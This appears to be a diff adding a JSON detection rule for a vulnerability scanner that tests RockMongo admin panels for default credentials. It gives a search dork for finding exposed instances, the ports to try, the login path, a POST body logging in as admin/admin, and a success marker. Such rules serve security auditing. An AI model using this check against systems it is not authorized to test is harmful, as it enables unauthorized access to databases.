@@ -1,0 +1,21 @@
+{
+    "name": "RockMongo_DefaultAuth",
+    "method": "POST",
+    "port": [
+        80,
+        81,
+        8080,
+        8090
+    ],
+    "dork": "title=RockMongo",
+    "suffix": [
+        "/index.php?action=login.index"
+    ],
+    "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "data": "more=0&host=0&username=admin&password=admin&db=&lang=zh_cn&expire=3",
+    "hits": [
+        "server.createDatabase"
+    ]
+}
